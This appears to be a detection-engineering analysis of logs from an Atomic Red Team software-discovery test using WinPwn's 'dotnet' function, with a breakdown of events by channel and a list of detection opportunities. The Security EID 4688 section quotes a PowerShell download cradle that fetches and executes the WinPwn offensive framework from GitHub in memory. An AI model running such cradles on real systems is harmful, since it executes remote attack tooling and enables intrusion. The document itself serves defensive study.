# T1518-5: Software Discovery — WinPwn DotNet

## Technique Context

T1518 (Software Discovery) encompasses adversary efforts to inventory software on a compromised host. WinPwn's `dotnet` function enumerates installed .NET Framework and .NET Core/5+ runtimes, letting an adversary understand which runtime-dependent tools and payloads will execute on the target. Like `Dotnetsearch` (T1518-4), the delivery mechanism is a `net.webclient.downloadstring` download cradle fetching the WinPwn framework directly from GitHub via `Invoke-Expression` — the "live off the internet" pattern that avoids writing a binary to disk.

The defended variant of this test (run with Defender enabled on ACME-WS02) produced zero events — AMSI or real-time protection blocked the download before any telemetry-generating child process was spawned, and the test framework `powershell.exe` was not matched by Sysmon's include-mode filter. This undefended dataset, captured on ACME-WS06 with Defender fully disabled via GPO, shows what actually runs when that block is absent.

## What This Dataset Contains

The dataset spans approximately 14 seconds (2026-03-17 17:04:55–17:05:09 UTC) on ACME-WS06 running as NT AUTHORITY\SYSTEM. It contains 170 events across six channels: 114 PowerShell, 44 Sysmon, 9 Security, 1 Application, 1 System, and 1 WMI.

**Security (9 events, EIDs 4624, 4672, 4688, 4799):** The key EID 4688 events are: `whoami.exe` (test framework pre-flight), the WinPwn download cradle `powershell.exe` with the full command line:

```
"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
dotnet -consoleoutput -noninteractive}
```

and `svchost.exe -k netsvcs -p -s BITS` — the Background Intelligent Transfer Service starting in the background, triggered by system activity coinciding with the test window. An EID 4624 (Logon Type 5) and EID 4672 (Special privileges) record a SYSTEM service logon. Two EID 4799 events record the `svchost.exe` BITS process enumerating the `Administrators` and `Backup Operators` local groups — standard service startup behavior, not caused by the technique.

**Sysmon (44 events, EIDs 1, 3, 7, 10, 11, 17, 22):** Sysmon EID 1 captures `whoami.exe` (tagged `T1033`) and the WinPwn `powershell.exe` (tagged `T1059.001`) with full command line and SHA256 hash. Notably, unlike T1518-4 where EID 22 captured `raw.githubusercontent.com` DNS resolution, no EID 22 DNS sample appears for this test — the connection appears to have proceeded from a cached DNS resolution. EID 7 records 29 DLL load events across the PowerShell processes, including `.NET` runtime libraries (`mscoree.dll`, `mscoreei.dll`, clr.dll) that confirm the WinPwn framework loaded and the .NET enumeration ran. EID 10 (ProcessAccess) fires twice with `GrantedAccess: 0x1FFFFF` (PROCESS_ALL_ACCESS), tagged `T1055.001`.

**PowerShell (114 events, EIDs 4100, 4103, 4104):** The volume of PowerShell events is identical to T1518-4 (114 events) despite invoking a different WinPwn function (`dotnet` vs `Dotnetsearch`). The 111 EID 4104 script blocks and 2 EID 4103 module logging events are consistent with the WinPwn framework successfully downloading and executing. The test framework boilerplate — `Set-ExecutionPolicy Bypass -Scope Process -Force` — is captured in both EID 4104 and EID 4103.

**Application (1 event, EID 15):** EID 15 records `Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON`. This is the Windows Security Center service noting a state transition — a background system event unrelated to the technique, reflecting the OS periodically checking or updating the registered security product state. This event is present in the undefended dataset because the system still tracks the Security Center state even with Defender GPO-disabled.

**System (1 event, EID 7040):** The Background Intelligent Transfer Service (BITS) service start type changed from demand start to automatic. This is OS background behavior coinciding with the BITS service startup visible in the Security 4688.

**WMI (1 event, EID 5860):** A temporary WMI event subscription was registered: `SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'wsmprovhost.exe'` by `NT AUTHORITY\SYSTEM` from PID 14424. This reflects the ART test framework monitoring for the `wsmprovhost.exe` process (PowerShell remoting host) as part of its orchestration logic — it is a test framework artifact, not technique behavior.

## What This Dataset Does Not Contain

- **No evidence of .NET enumeration output.** The function ran (`dotnet -consoleoutput -noninteractive`), but what it returned — the list of installed .NET runtimes — is not captured in event logs.
- **No AMSI block.** The defended variant generated no events whatsoever because AMSI blocked the download entirely. This undefended dataset is the only source of technique telemetry for this test.
- **No Defender cloud protection connections.** With Defender disabled, the EID 3 `MsMpEng.exe` connections to `172.178.160.22:443` seen in the defended T1518-4 variant are absent.
- **No distinct DNS query event for raw.githubusercontent.com** in the surfaced samples — likely a cached resolution from the prior T1518-4 test run.

## Assessment

This dataset provides the only available telemetry for the WinPwn `dotnet` function. The defended variant was a complete blank — zero events. Here, you see the full execution chain: download cradle in the command line (Security EID 4688), child process creation with the commit-pinned URL (Sysmon EID 1), .NET runtime DLL loads confirming the framework ran (Sysmon EID 7), and 114 PowerShell events reflecting the framework's activity.

The behavioral profile is nearly identical to T1518-4 (`Dotnetsearch`). The only observable difference is the function name in the command line — `dotnet` vs `Dotnetsearch`. Both use the same commit-pinned WinPwn URL, the same `net.webclient.downloadstring` cradle, and the same `-consoleoutput -noninteractive` flags. This similarity is intentional: these WinPwn functions share infrastructure and differ only in what enumeration they perform internally. The six additional channels in this dataset (Application, System, WMI) are background OS activity that happened to fall within the collection window, not caused by the technique.

## Detection Opportunities Present in This Data

- **Security EID 4688 command line:** The WinPwn download cradle with the `dotnet` function invocation and commit-pinned GitHub URL is captured verbatim. The parent-child `powershell → powershell` spawn pattern with a `raw.githubusercontent.com` URL in the child's command line is a strong behavioral indicator.
- **Sysmon EID 1:** Full command line, SHA256 hash, and process tree preserved. The `T1059.001` RuleName tag confirms the sysmon-modular configuration caught this invocation.
- **Sysmon EID 7 (ImageLoad):** The sequence of `.NET` CLR libraries loading into `powershell.exe` following a download cradle execution is consistent with in-memory framework activity. Correlating EID 7 `.NET` runtime loads against a prior EID 1 or EID 3 network event from the same process narrows the detection surface.
- **Application EID 15 (Security Center state):** The `SECURITY_PRODUCT_STATE_ON` record, while benign here, confirms the collection pipeline is capturing Application log events in this test window — useful for baseline comparison against tests where Defender state transitions are more significant.
- **WMI EID 5860:** The ART test framework `wsmprovhost.exe` watch subscription is a test framework-specific artifact that can be used to identify and filter test-generated events in a production dataset.
